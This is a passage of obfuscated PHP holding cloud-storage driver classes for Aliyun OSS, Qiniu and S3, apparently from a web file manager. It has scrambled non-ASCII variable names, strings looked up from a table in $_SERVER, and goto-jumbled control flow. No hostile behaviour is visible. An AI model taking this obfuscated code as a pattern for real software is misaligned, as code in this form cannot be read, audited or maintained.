fileOutServer($a°Ü”¶µ¬§, $a‚´éòÍô = false, $Ešï¯áæ ì = false, $DàÃ«™À = '') { parent::fileOut($a°Ü”¶µ¬§, $a‚´éòÍô, $Ešï¯áæ ì, $DàÃ«™À); } public function fileOutImage($Eî³¾äØ•ì, $DîĞ×†Î¼ä = 250) { $cƒä…½ù½ª = array(OSS\OssClient::OSS_PROCESS => $_SERVER[©][1208] . $DîĞ×†Î¼ä); $DğÕÎÄÎÚ = $this->link($Eî³¾äØ•ì, $cƒä…½ù½ª); $this->fileOutLink($DğÕÎÄÎÚ); } public function fileOutImageServer($aóÊ˜”Š, $eÏ™¹îƒ–› = 250) { parent::fileOutImage($aóÊ˜”Š, $eÏ™¹îƒ–›); } public function fileOutLink($AİÔ†Æô†ò) { $f­ƒÁè´ßó =& $_SERVER[©]; if (!$this->isCdnHost() && substr($AİÔ†Æô†ò, 0, 7) == $f­ƒÁè´ßó[1112]) { $AİÔ†Æô†ò = $f­ƒÁè´ßó[1113] . substr($AİÔ†Æô†ò, 7); } header($f­ƒÁè´ßó[166] . $AİÔ†Æô†ò); die; } public function hashMd5($C²ø´·¿, $aÑ¼¥Ù¶ Å = '') { $A¾…ªø‰Ÿ¡ =& $_SERVER[©]; $Eå•ÚÙÄ‘© = $this->objectMeta($C²ø´·¿); if (!$Eå•ÚÙÄ‘©) { return $A¾…ªø‰Ÿ¡[43]; } if (!isset($Eå•ÚÙÄ‘©[$A¾…ªø‰Ÿ¡[1181]]) && !empty($aÑ¼¥Ù¶ Å)) { $B•Ç²Ñã‘“ = $this->updateObjMeta($C²ø´·¿, array($A¾…ªø‰Ÿ¡[1181] => $aÑ¼¥Ù¶ Å)); $Eå•ÚÙÄ‘©[$A¾…ªø‰Ÿ¡[1181]] = $B•Ç²Ñã‘“ ? $aÑ¼¥Ù¶ Å : $A¾…ªø‰Ÿ¡[43]; } return isset($Eå•ÚÙÄ‘©[$A¾…ªø‰Ÿ¡[1181]]) ? strtolower($Eå•ÚÙÄ‘©[$A¾…ªø‰Ÿ¡[1181]]) : $A¾…ªø‰Ÿ¡[43]; } public function size($EÜ‰À–ÅÏî) { $B®§æƒ‘ß = $this->objectMeta($EÜ‰À–ÅÏî); return $B®§æƒ‘ß ? $B®§æƒ‘ß[$_SERVER[©][87]] : 0; } public function info($C» óÔƒ) { if ($this->isFolder($C» óÔƒ)) { return $this->folderInfo($C» óÔƒ); } else { if ($this->isFile($C» óÔƒ)) { return $this->fileInfo($C» óÔƒ); } } return !1; } public function exist($DÎ‚×¢–õ«) { return $this->isFile($DÎ‚×¢–õ«) || $this->isFolder($DÎ‚×¢–õ«); } public function isFile($båË«ôğ) { return !$this->isFolder($båË«ôğ) && $this->objectMeta($båË«ôğ); } public function isFolder($f‘‰·Ì) { return $this->cacheMethod($_SERVER[©][232], $f‘‰·Ì); } protected function objectMeta($Bæ‹ŠÉ÷‚) { return $this->cacheMethod($_SERVER[©][233], $Bæ‹ŠÉ÷‚); } protected function _objectMeta($a¯Ø³øãÒ) { $cù¿õõµ± =& $_SERVER[©]; try { $Dˆ¬ÕÀ†â© = $this->client->getObjectMeta($this->bucket, $this->pathEncode($a¯Ø³øãÒ)); } catch (OSS\Core\OssException $D¥ªÄŠ˜Èå) { $Dˆ¬ÕÀ†â© = !1; } if ($Dˆ¬ÕÀ†â©) { $Dˆ¬ÕÀ†â©[$cù¿õõµ±[87]] = intval($Dˆ¬ÕÀ†â©[$cù¿õõµ±[1188]]); } return $Dˆ¬ÕÀ†â©; } protected function _isFolder($eŠïàÏÅ³) { $EÑ÷…±ÂÄ‡ =& $_SERVER[©]; if ($eŠïàÏÅ³ == $EÑ÷…±ÂÄ‡[43] || $eŠïàÏÅ³ == $EÑ÷…±ÂÄ‡[18]) { return !0; } $DÜâª±ÛÁ¯ = array($EÑ÷…±ÂÄ‡[1178] => $EÑ÷…±ÂÄ‡[18], $EÑ÷…±ÂÄ‡[196] => rtrim($eŠïàÏÅ³, $EÑ÷…±ÂÄ‡[18]) . $EÑ÷…±ÂÄ‡[18], $EÑ÷…±ÂÄ‡[1179] => 1, $EÑ÷…±ÂÄ‡[1180] => $EÑ÷…±ÂÄ‡[43]); $fŒâÊİ‘¡İ = $this->client->listObjects($this->bucket, $DÜâª±ÛÁ¯); if ($fŒâÊİ‘¡İ->getObjectList() || $fŒâÊİ‘¡İ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($cô¹õ­‰êÊ) { parent::__construct(); require_once SDK_DIR . $_SERVER[©][1209]; $this->_init($cô¹õ­‰êÊ); } public function _init($fé×šõ°ôÆ) { foreach ($fé×šõ°ôÆ as $C—×›ã¯ => $f‹•ğ×İÔ) { if (isset($this->{$C—×›ã¯})) { $this->{$C—×›ã¯} = $f‹•ğ×İÔ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[©][1210], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($AÆ…÷§ƒæ™, $BÀ„õÃÅ˜ = '', $Eéñªç™¾‚ = REPEAT_RENAME) { if ($this->setContent($AÆ…÷§ƒæ™, $BÀ„õÃÅ˜)) { return $this->getPathOuter($AÆ…÷§ƒæ™); } return !1; } public function mkdir($E“¬³„‰‘Á, $Fè·‰–—® = REPEAT_SKIP) { goto A©Æ±÷î‡Ø; f³‰âğãˆ: if (!$this->mkfile($B­Ğ‚Ş›ÀÁ)) { return !1; } if (!$this->moveFile($B­Ğ‚Ş›ÀÁ, $E“¬³„‰‘Á)) { $this->delFile($B­Ğ‚Ş›ÀÁ); return !1; } return $this->getPathOuter($C²ĞË…áê); goto c±‰ô‡¿Î; A©Æ±÷î‡Ø: $a‹ÉÂËäî– =& $_SERVER[©]; $C²ĞË…áê = trim($E“¬³„‰‘Á, $a‹ÉÂËäî–[18]); if ($this->_isFolder($C²ĞË…áê)) { return $this->getPathOuter($C²ĞË…áê); } goto Eùøô‹›Õ; Eùøô‹›Õ: $E“¬³„‰‘Á = $C²ĞË…áê . $a‹ÉÂËäî–[18]; $aÂâ­–Š¶Ò = get_path_this($C²ĞË…áê); $B­Ğ‚Ş›ÀÁ = $E“¬³„‰‘Á . $aÂâ­–Š¶Ò; goto f³‰âğãˆ; c±‰ô‡¿Î: } public function copyFile($e¢«ŠÎŸßÀ, $d¹¿‘…Ö©Å) { $AĞÔ÷·¨„ = $this->bucketManager->copy($this->bucket, $e¢«ŠÎŸßÀ, $this->bucket, $d¹¿‘…Ö©Å, !0); return $AĞÔ÷·¨„ ? !1 : $this->getPathOuter($d¹¿‘…Ö©Å); } public function moveFile($B˜’±©Ëêí, $f†ãÂöÍ¯) { $a§ÚŒ×¡ƒÈ = $this->bucketManager->move($this->bucket, $B˜’±©Ëêí, $this->bucket, $f†ãÂöÍ¯, !0); return $a§ÚŒ×¡ƒÈ ? !1 : $this->getPathOuter($f†ãÂöÍ¯); } public function delFile($c¾à”ÊË) { $f´¢”ê¸° = $this->bucketManager->delete($this->bucket, $c¾à”ÊË); return $f´¢”ê¸° ? !1 : !0; } public function delFolder($A÷‰Ú¹Õ) { $D’®Å­Ìİø = $this->fileList($A÷‰Ú¹Õ); if (empty($D’®Å­Ìİø)) { return !0; } $aóÙƒàÙéŠ = 1000; if (count($D’®Å­Ìİø) <= $aóÙƒàÙéŠ) { return $this->qnDelObj($D’®Å­Ìİø) ? !1 : !0; } foreach (array_chunk($D’®Å­Ìİø, $aóÙƒàÙéŠ) as $AÕæ—éÕç) { $Aì¾¦…÷Š† = $this->qnDelObj($AÕæ—éÕç); if ($Aì¾¦…÷Š†) { return !1; } } return !0; } private function qnDelObj($E›è¥Åèù) { $e‚é‡ø´Ô = $this->bucketManager->buildBatchDelete($this->bucket, $E›è¥Åèù); list($e½ª¥Ù‘·™, $E‡Æ½ø­‚) = $this->bucketManager->batch($e‚é‡ø´Ô); return $E‡Æ½ø­‚; } private function fileList($b‹Ó»îÈŠ½, $e¢»åç„ = 0) { goto c»Åˆ‚œÇÖ; c»Åˆ‚œÇÖ: $BæÃœ“¤© =& $_SERVER[©]; $b‹Ó»îÈŠ½ = trim($b‹Ó»îÈŠ½, $BæÃœ“¤©[18]); $Bõ İµ¢Ö = empty($b‹Ó»îÈŠ½) ? $BæÃœ“¤©[43] : $b‹Ó»îÈŠ½ . $BæÃœ“¤©[18]; goto Dôô¿ŠÕ˜®; EÅš­Ü‡â„: $Bôª×”„œ = array(); while (!0) { list($cİ·ã–´†, $EÆÚÉß•í) = $this->bucketManager->listFiles($this->bucket, $Bõ İµ¢Ö, $a©õíöÎ‚¦, $aĞ˜Ä·Áˆ”, $aÒÅó›×š); if ($EÆÚÉß•í) { return !1; } $a©õíöÎ‚¦ = array_key_exists($BæÃœ“¤©[1180], $cİ·ã–´†) ? $a©õíöÎ‚¦ = $cİ·ã–´†[$BæÃœ“¤©[1211]] : $BæÃœ“¤©[43]; foreach ($cİ·ã–´†[$BæÃœ“¤©[1212]] as $FÖáˆ„—Ÿ…) { $FÃËö¢‹†± = $FÖáˆ„—Ÿ…[$BæÃœ“¤©[99]]; if ($e¢»åç„) { $FÃËö¢‹†± = array($BæÃœ“¤©[38] => $FÃËö¢‹†±, $BæÃœ“¤©[87] => $FÖáˆ„—Ÿ…[$BæÃœ“¤©[1213]]); } $Bôª×”„œ[] = $FÃËö¢‹†±; } if ($a©õíöÎ‚¦ == $BæÃœ“¤©[43]) { break; } } return $Bôª×”„œ; goto eâÌÊ™ö¨; Dôô¿ŠÕ˜®: $a©õíöÎ‚¦ = $BæÃœ“¤©[43]; $aĞ˜Ä·Áˆ” = 1000; $aÒÅó›×š = $BæÃœ“¤©[43]; goto EÅš­Ü‡â„; eâÌÊ™ö¨: } public function rename($FÔ­™¿Œ¿İ, $d™öá…š°Î) { return $this->renameObject($FÔ­™¿Œ¿İ, $d™öá…š°Î); } public function fileInfo($e’é·Ó†ï™, $D¨á³»È‘„ = false, $F®Ä””µñ = array()) { goto eÂÈ°»ñà; cÓä¬‹¯Ï: if (empty($F®Ä””µñ)) { $F®Ä””µñ = $this->objectMeta($e’é·Ó†ï™); if (!$F®Ä””µñ) { return $cå„‚ŠÊ’Â; } } if (isset($F®Ä””µñ[$F‡šñ¦İ¨[1214]])) { $cå„‚ŠÊ’Â[$F‡šñ¦İ¨[117]] = substr($F®Ä””µñ[$F‡šñ¦İ¨[1214]] . $F‡šñ¦İ¨[43], 0, 10); } if (isset($F®Ä””µñ[$F‡šñ¦İ¨[1213]])) { $cå„‚ŠÊ’Â[$F‡šñ¦İ¨[87]] = $F®Ä””µñ[$F‡šñ¦İ¨[1213]]; } goto F­©íôîà; F­©íôîà: return $cå„‚ŠÊ’Â; goto EìÍœÃæÏ; eÂÈ°»ñà: $F‡šñ¦İ¨ =& $_SERVER[©]; if ($D¨á³»È‘„) { return array($F‡šñ¦İ¨[38] => $this->pathThis($e’é·Ó†ï™), $F‡šñ¦İ¨[85] => $this->getPathOuter($F‡šñ¦İ¨[18] . $e’é·Ó†ï™), $F‡šñ¦İ¨[39] => $F‡šñ¦İ¨[177], $F‡šñ¦İ¨[87] => isset($F®Ä””µñ[$F‡šñ¦İ¨[1213]]) ? $F®Ä””µñ[$F‡šñ¦İ¨[1213]] : 0, $F‡šñ¦İ¨[170] => $this->ext($e’é·Ó†ï™)); } $cå„‚ŠÊ’Â = array($F‡šñ¦İ¨[38] => $this->pathThis($e’é·Ó†ï™), $F‡šñ¦İ¨[85] => $this->getPathOuter($F‡šñ¦İ¨[18] . $e’é·Ó†ï™), $F‡šñ¦İ¨[39] => $F‡šñ¦İ¨[177], $F‡šñ¦İ¨[197] => 0, $F‡šñ¦İ¨[117] => 0, $F‡šñ¦İ¨[87] => 0, $F‡šñ¦İ¨[170] => $this->ext($e’é·Ó†ï™), $F‡šñ¦İ¨[198] => !0, $F‡šñ¦İ¨[199] => !0); goto cÓä¬‹¯Ï; EìÍœÃæÏ: } public function folderInfo($f·ÊÊƒˆíÉ, $a¸±‚Öğ›Ú = false) { goto A—‡ ­†Å; aÎçïêãÅ: $f·ÊÊƒˆíÉ = rtrim($f·ÊÊƒˆíÉ, $f©äŸëø„[18]) . $f©äŸëø„[18]; $aÜâˆƒ­­ğ = $this->objectMeta($f·ÊÊƒˆíÉ); if (isset($aÜâˆƒ­­ğ[$f©äŸëø„[1214]])) { $C‚ŒßŞª®´[$f©äŸëø„[117]] = substr($aÜâˆƒ­­ğ[$f©äŸëø„[1214]] . $f©äŸëø„[43], 0, 10); } goto cÜÔèôĞø­; A—‡ ­†Å: $f©äŸëø„ =& $_SERVER[©]; if ($a¸±‚Öğ›Ú) { return array($f©äŸëø„[38] => $this->pathThis($f·ÊÊƒˆíÉ), $f©äŸëø„[85] => $this->getPathOuter($f©äŸëø„[18] . $f·ÊÊƒˆíÉ), $f©äŸëø„[39] => $f©äŸëø„[86]); } $C‚ŒßŞª®´ = array($f©äŸëø„[38] => $this->pathThis($f·ÊÊƒˆíÉ), $f©äŸëø„[85] => $this->getPathOuter($f©äŸëø„[18] . $f·ÊÊƒˆíÉ), $f©äŸëø„[39] => $f©äŸëø„[86], $f©äŸëø„[197] => 0, $f©äŸëø„[117] => 0, $f©äŸëø„[1159] => !0, $f©äŸëø„[1160] => !0); goto aÎçïêãÅ; cÜÔèôĞø­: return $C‚ŒßŞª®´; goto bã‰‰è·‚Ÿ; bã‰‰è·‚Ÿ: } public function listPath($fÈÈ¦š¦¤, $BÙÙùåÇ…é = false) { goto fÃ¡Ñçğº; c‰àºÏ“‹‚: $e°ßÂ¡Ö ô = $Dš©İ­ô¦[43]; $DŸªò¢ºò‚ = 1000; $cµê™Øî = $Dš©İ­ô¦[18]; goto a†œ¶‡ãÃ¥; a†œ¶‡ãÃ¥: $A£ë«Èö = $b„„š ®Û¸ = array(); while (!0) { list($FÓÚîÄßº, $fŸå†½¨·) = $this->bucketManager->listFiles($this->bucket, $D¿ÜáÙ, $e°ßÂ¡Ö ô, $DŸªò¢ºò‚, $cµê™Øî); if ($fŸå†½¨·) { return !1; } $e°ßÂ¡Ö ô = array_key_exists($Dš©İ­ô¦[1180], $FÓÚîÄßº) ? $e°ßÂ¡Ö ô = $FÓÚîÄßº[$Dš©İ­ô¦[1211]] : $Dš©İ­ô¦[43]; if (isset($FÓÚîÄßº[$Dš©İ­ô¦[1215]])) { foreach ($FÓÚîÄßº[$Dš©İ­ô¦[1215]] as $cŠ…Éé›¦») { if ($cŠ…Éé›¦» == $D¿ÜáÙ) { continue; } $A£ë«Èö[] = $this->folderInfo($cŠ…Éé›¦», $BÙÙùåÇ…é); } } if (isset($FÓÚîÄßº[$Dš©İ­ô¦[1212]])) { foreach ($FÓÚîÄßº[$Dš©İ­ô¦[1212]] as $e‘®ëÚÕÁ‹) { if ($e‘®ëÚÕÁ‹[$Dš©İ­ô¦[99]] == $D¿ÜáÙ) { continue; } $b„„š ®Û¸[] = $this->fileInfo($e‘®ëÚÕÁ‹[$Dš©İ­ô¦[99]], $BÙÙùåÇ…é, $e‘®ëÚÕÁ‹); } } if ($e°ßÂ¡Ö ô == $Dš©İ­ô¦[43]) { break; } } return array($Dš©İ­ô¦[84] => $A£ë«Èö, $Dš©İ­ô¦[83] => $b„„š ®Û¸); goto C÷‡§’¢Ÿâ; fÃ¡Ñçğº: $Dš©İ­ô¦ =& $_SERVER[©]; $fÈÈ¦š¦¤ = trim($fÈÈ¦š¦¤, $Dš©İ­ô¦[18]); $D¿ÜáÙ = empty($fÈÈ¦š¦¤) ? $Dš©İ­ô¦[43] : $fÈÈ¦š¦¤ . $Dš©İ­ô¦[18]; goto c‰àºÏ“‹‚; C÷‡§’¢Ÿâ: } public function has($b—ëãÇŸ‚·, $DÓÆä¤ñœ = false, $E¹ë‡´ÚšŠ = true) { goto BéÃØË£“—; D•ï¦§¤Ç: $d«Õù»©³Õ = $d…ë¹ÙˆÛØ[43]; $D„©õÙµ× = 1000; $fŠè¬¦Š‚ = $d…ë¹ÙˆÛØ[18]; goto fÔÒØ°ÎËô; fÔÒØ°ÎËô: $Cá¼¢Àùø = 0; $aéÌçäŸ—› = 0; while (!0) { list($BÔ„ëÌ¨ˆ, $B¡ƒëõï¨Ã) = $this->bucketManager->listFiles($this->bucket, $FğîÛ½‚Ô, $d«Õù»©³Õ, $D„©õÙµ×, $fŠè¬¦Š‚); if ($B¡ƒëõï¨Ã) { return !1; } $d«Õù»©³Õ = array_key_exists($d…ë¹ÙˆÛØ[1180], $BÔ„ëÌ¨ˆ) ? $d«Õù»©³Õ = $BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1211]] : $d…ë¹ÙˆÛØ[43]; if ($DÓÆä¤ñœ) { if (!empty($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1212]])) { $Cá¼¢Àùø += count($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1212]]); } if (!empty($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1215]])) { $aéÌçäŸ—› += count($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1215]]); } if ($d«Õù»©³Õ === $d…ë¹ÙˆÛØ[43]) { break; } continue; } if ($E¹ë‡´ÚšŠ) { if (!empty($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1212]])) { return !0; } } else { if (!empty($BÔ„ëÌ¨ˆ[$d…ë¹ÙˆÛØ[1215]])) { return !0; } } if ($d«Õù»©³Õ == $d…ë¹ÙˆÛØ[43]) { break; } } goto DåËÂ°ºä¿; BéÃØË£“—: $d…ë¹ÙˆÛØ =& $_SERVER[©]; $b—ëãÇŸ‚· = trim($b—ëãÇŸ‚·, $d…ë¹ÙˆÛØ[18]); $FğîÛ½‚Ô = empty($b—ëãÇŸ‚·) ? $d…ë¹ÙˆÛØ[43] : $b—ëãÇŸ‚· . $d…ë¹ÙˆÛØ[18]; goto D•ï¦§¤Ç; DåËÂ°ºä¿: if ($DÓÆä¤ñœ) { return array($d…ë¹ÙˆÛØ[201] => $Cá¼¢Àùø, $d…ë¹ÙˆÛØ[202] => $aéÌçäŸ—›); } return !1; goto dì®İ§Úº‘; dì®İ§Úº‘: } public function listAll($bÔ•¡®•È›) { $e¹Şùèœ‡š =& $_SERVER[©]; $F¹ª³Âìâ = $this->fileList($bÔ•¡®•È›, 1); $dÏÚŠÇ„³ = array(); foreach ($F¹ª³Âìâ as $D…ê¤ŞÓÚ‚) { $dÏÚŠÇ„³[$D…ê¤ŞÓÚ‚[$e¹Şùèœ‡š[38]]] = $D…ê¤ŞÓÚ‚[$e¹Şùèœ‡š[87]]; } return $this->listAllFiles($bÔ•¡®•È›, array_keys($dÏÚŠÇ„³), $dÏÚŠÇ„³); } public function canRead($B–ëî»×ˆ) { return $this->exist($B–ëî»×ˆ) ? !0 : !1; } public function canWrite($Fßäª•‚“¢) { return $this->exist($Fßäª•‚“¢) ? !0 : !1; } public function getContent($BÏåèè‚î¨) { return $this->fileSubstr($BÏåèè‚î¨, 0, -1); } public function setContent($A‚ÅŠ¡ğ‹¾, $FêÙ¸Íß•’ = '') { $f¢ô‡Â´ª = $this->tempFile($this->pathThis($A‚ÅŠ¡ğ‹¾)); file_put_contents($f¢ô‡Â´ª, $FêÙ¸Íß•’); if ($this->upload($A‚ÅŠ¡ğ‹¾, $f¢ô‡Â´ª)) { $this->tempFileRemve($f¢ô‡Â´ª); return !0; } return !1; } public function refreshUrls($C‹Š½£ƒ¡) { goto BåÜµÓÄ‰; B§ø¨™øßñ: $Fª¶ØÖßøé = new Qiniu\Cdn\CdnManager($this->auth); list($f…Î²Í‡à, $cƒ”§¾¢‡©) = $Fª¶ØÖßøé->refreshUrls($AĞ¶Ó£‰Îô); if ($cƒ”§¾¢‡©) { return !1; } goto D”È†Ğë‡è; D”È†Ğë‡è: return $f…Î²Í‡à[$b‡¶÷Ó»[1216]] == $b‡¶÷Ó»[695] ? !0 : !1; goto d»Ø©Ö Ÿ÷; BåÜµÓÄ‰: $b‡¶÷Ó» =& $_SERVER[©]; $AĞ¶Ó£‰Îô = array(); if (is_array($C‹Š½£ƒ¡)) { foreach ($C‹Š½£ƒ¡ as $a’®¼”èÎ…) { $AĞ¶Ó£‰Îô[] = $this->link($a’®¼”èÎ…); } } else { $AĞ¶Ó£‰Îô[] = $this->link($C‹Š½£ƒ¡); } goto B§ø¨™øßñ; d»Ø©Ö Ÿ÷: } public function fileSubstr($c¦¨Ö­†ù, $DÕéìäŞÎç, $B˜´õÎ¼É) { $dÑ—µÅŸÉ =& $_SERVER[©]; if (!($AÚĞÈÅ‡£î = $this->link($c¦¨Ö­†ù))) { return !1; } $C„¹ƒÀŞˆô = !1; if ($B˜´õÎ¼É > 0) { $C·Ö¿¿ÓÊé = $DÕéìäŞÎç + $B˜´õÎ¼É - 1; $C„¹ƒÀŞˆô = array($dÑ—µÅŸÉ[1217] . $DÕéìäŞÎç . $dÑ—µÅŸÉ[420] . $C·Ö¿¿ÓÊé); } $E§æ®¦È÷ = url_request($AÚĞÈÅ‡£î, $dÑ—µÅŸÉ[226], !1, $C„¹ƒÀŞˆô); return $E§æ®¦È÷[$dÑ—µÅŸÉ[688]] ? $E§æ®¦È÷[$dÑ—µÅŸÉ[1031]] : !1; } public function upload($AĞ¨àÎß³©, $aíô’³®¸­, $a­µ¯Á¬í = false, $FôÄ‡Ù¼™ë = REPEAT_REPLACE) { $a²Êğ¦‹à = new Qiniu\Storage\UploadManager(); $D¬™Á·ê = $this->auth->uploadToken($this->bucket, $AĞ¨àÎß³©); $AÛ²¤ğšá— = get_file_mime(get_path_ext($aíô’³®¸­)); list($f…õ¹‰¸“«, $cæ¡Â—ç¸) = $a²Êğ¦‹à->putFile($D¬™Á·ê, $AĞ¨àÎß³©, $aíô’³®¸­, null, $AÛ²¤ğšá—); return $cæ¡Â—ç¸ ? !1 : $this->getPathOuter($AĞ¨àÎß³©); } public function uploadFormData($fØÑ‹§Î¿, $eÃï× äö = 3600) { return $this->uploadToken($fØÑ‹§Î¿, $eÃï× äö); } public function multiUploadFormData($B·½ô»‹ò, $d¼Ûø‚×ë™ = 3600) { return $this->uploadToken($B·½ô»‹ò, $d¼Ûø‚×ë™); } private function uploadToken($bêªÖ ìÓ†, $Dó¥´£×ÛØ = 3600) { goto EåŠ•­áÕ†; FÄ”ïïšˆË: $Dâ’ì¹Â¹Ä = http_type() . "\x3a\x2f\57\x75\x70\x6c\x6f\141\144{$d©®ëôÛ•Ö}\56\161\x69\x6e\x69\165\x70\56\143\x6f\155\57"; return array($dãö÷†Î½Ÿ[1221] => $Fµã”ôÍœ, $dãö÷†Î½Ÿ[1222] => $Dâ’ì¹Â¹Ä); goto fÑ¸ƒ¶–ô; A¾§•Á‰½Ä: $bŠ“ŒŒ‚ = null; $Fµã”ôÍœ = $this->auth->uploadToken($this->bucket, $bŠ“ŒŒ‚, $e©†›äô¿â, $FˆïˆŠäÚ, !0); $d©®ëôÛ•Ö = empty($this->region) || $this->region == $dãö÷†Î½Ÿ[1220] ? $dãö÷†Î½Ÿ[43] : $dãö÷†Î½Ÿ[420] . $this->region; goto FÄ”ïïšˆË; EåŠ•­áÕ†: $dãö÷†Î½Ÿ =& $_SERVER[©]; $e©†›äô¿â = $Dó¥´£×ÛØ; $FˆïˆŠäÚ = array($dãö÷†Î½Ÿ[1218] => $dãö÷†Î½Ÿ[1219]); goto A¾§•Á‰½Ä; fÑ¸ƒ¶–ô: } public function download($B©¡Ç•º·, $Bø¦¯î‚è‡) { goto EÙ«¼çáò¾; E¶á´Á®ÁÀ: $dŠùÅ‚’„Å = 1024 * 200; $FÕÒÚ­·Ü = fopen($cÈ®åÏÇ•, $_SERVER[©][1223]); while (!0) { $BŞÏ±¨‘ÀÔ = $this->fileSubstr($B©¡Ç•º·, $b”Ú§‘ò†­, $dŠùÅ‚’„Å); if ($BŞÏ±¨‘ÀÔ === !1) { return !1; } fwrite($FÕÒÚ­·Ü, $BŞÏ±¨‘ÀÔ); $b”Ú§‘ò†­ += $dŠùÅ‚’„Å; if (strlen($BŞÏ±¨‘ÀÔ) < $dŠùÅ‚’„Å) { break; } } goto D‚á¹§…·ô; D‚á¹§…·ô: fclose($FÕÒÚ­·Ü); return $Bø¦¯î‚è‡; goto d‘ô­Ù­; EÙ«¼çáò¾: $cÈ®åÏÇ• = IO::getPathInner(IO::mkfile($Bø¦¯î‚è‡)); if (!($A‰±Í×Äá– = $this->link($B©¡Ç•º·))) { return !1; } $b”Ú§‘ò†­ = 0; goto E¶á´Á®ÁÀ; d‘ô­Ù­: } public function link($f…‹ßïÆ», $C™ÔœëŞ‰ó = '') { if (!$this->isFile($f…‹ßïÆ»)) { return !1; } $f’•ğ°«Ü¬ = $this->getHost() . $_SERVER[©][18] . $this->pathEncode($f…‹ßïÆ») . $C™ÔœëŞ‰ó; return $this->auth->privateDownloadUrl($f’•ğ°«Ü¬, 3600 * 12); } public function fileOut($D˜–ŸÎ²ë¤, $C½—ß‡§ñŸ = false, $B°‹•åäÓ = false, $EÊ­â³šö… = '') { $c÷®Ş»ªø÷ =& $_SERVER[©]; if (!$B°‹•åäÓ) { $B°‹•åäÓ = $this->pathThis($D˜–ŸÎ²ë¤); } $b©ªÉ‰ñğ¢ = $C½—ß‡§ñŸ ? $c÷®Ş»ªø÷[1224] . rawurlencode($B°‹•åäÓ) : $c÷®Ş»ªø÷[43]; $cÈÂ“‡š = $this->link($D˜–ŸÎ²ë¤, $b©ªÉ‰ñğ¢); $this->fileOutLink($cÈÂ“‡š); } public function fileOutServer($CÑ¸„ÊÈÏğ, $aëÕ‡ÄĞ¯ß = false, $b“×‹´Á¿ = false, $A°·Ç·ÅŠŒ = '') { parent::fileOut($CÑ¸„ÊÈÏğ, $aëÕ‡ÄĞ¯ß, $b“×‹´Á¿, $A°·Ç·ÅŠŒ); } public function fileOutImage($fèÜÑ“×‰¥, $D‰¡¨®¯Öª = 250) { $fŞ«¬¸è = $this->link($fèÜÑ“×‰¥, $_SERVER[©][1225] . $D‰¡¨®¯Öª); $this->fileOutLink($fŞ«¬¸è); } public function fileOutImageServer($fÓ´ÃæàÀ, $b†…âî„ñ† = 250) { parent::fileOutImage($fÓ´ÃæàÀ, $b†…âî„ñ†); } public function hashMd5($C­ñãæš±¨) { $EÃ«ÁòÀ =& $_SERVER[©]; $c•éÏ‰„¤Ÿ = $this->objectMeta($C­ñãæš±¨); return isset($c•éÏ‰„¤Ÿ[$EÃ«ÁòÀ[206]]) ? $c•éÏ‰„¤Ÿ[$EÃ«ÁòÀ[206]] : !1; $FòÈ¡»‚³ˆ = $this->link($C­ñãæš±¨, $EÃ«ÁòÀ[1226]); } public function size($EŒ¢ì¢ÚóÁ) { $B³ó‚š¨¯ = $this->objectMeta($EŒ¢ì¢ÚóÁ); return $B³ó‚š¨¯ ? $B³ó‚š¨¯[$_SERVER[©][87]] : 0; } public function info($F¶íğéÊê±) { if ($this->isFolder($F¶íğéÊê±)) { return $this->folderInfo($F¶íğéÊê±); } else { if ($this->isFile($F¶íğéÊê±)) { return $this->fileInfo($F¶íğéÊê±); } } return !1; } public function exist($E¾‹é‡Ùà) { return $this->isFile($E¾‹é‡Ùà) || $this->isFolder($E¾‹é‡Ùà); } public function isFile($B´İÜ¥í³º) { return !$this->isFolder($B´İÜ¥í³º) && $this->objectMeta($B´İÜ¥í³º); } public function isFolder($A½¿ ë•ì) { return $this->cacheMethod($_SERVER[©][232], $A½¿ ë•ì); } protected function objectMeta($dˆÑî³êã) { return $this->cacheMethod($_SERVER[©][233], $dˆÑî³êã); } protected function _objectMeta($a÷§ùÍ©¹›) { $d¸¨ç¼ê›ê =& $_SERVER[©]; list($dä¥ƒ ğ, $DµÌÄÉ´¶‰) = $this->bucketManager->stat($this->bucket, $a÷§ùÍ©¹›); if ($dä¥ƒ ğ) { $dä¥ƒ ğ[$d¸¨ç¼ê›ê[87]] = intval($dä¥ƒ ğ[$d¸¨ç¼ê›ê[1213]]); } return $dä¥ƒ ğ; } protected function _isFolder($F”ÂØØ²Â) { $e•õŒó¾‡ =& $_SERVER[©]; if ($F”ÂØØ²Â == $e•õŒó¾‡[43] || $F”ÂØØ²Â == $e•õŒó¾‡[18]) { return !0; } list($aÁ…çƒ™¯®, $B¡ÛÔÓÂ¯¦) = $this->bucketManager->listFiles($this->bucket, trim($F”ÂØØ²Â, $e•õŒó¾‡[18]) . $e•õŒó¾‡[18], $e•õŒó¾‡[43], 1, $e•õŒó¾‡[18]); return !empty($aÁ…çƒ™¯®[$e•õŒó¾‡[1212]]) || !empty($aÁ…çƒ™¯®[$e•õŒó¾‡[1215]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($a«ö¾‡ˆØÇ) { parent::__construct($a«ö¾‡ˆØÇ); } public function uploadFormData($A¯À†ìñ‡á, $c·¿È©Èô = 3600) { goto AÂâ×ô»Ñà; F»‰ù·ôé†: $dÃğáÔº˜³ = array($C¼¿ó— Ğà[209] => $C¼¿ó— Ğà[43], $C¼¿ó— Ğà[1143] => $C¼¿ó— Ğà[43], $C¼¿ó— Ğà[1101] => $bÚ‰‚è½ĞÓ, $C¼¿ó— Ğà[1105] => $fÜ‡Çèˆí¤, $C¼¿ó— 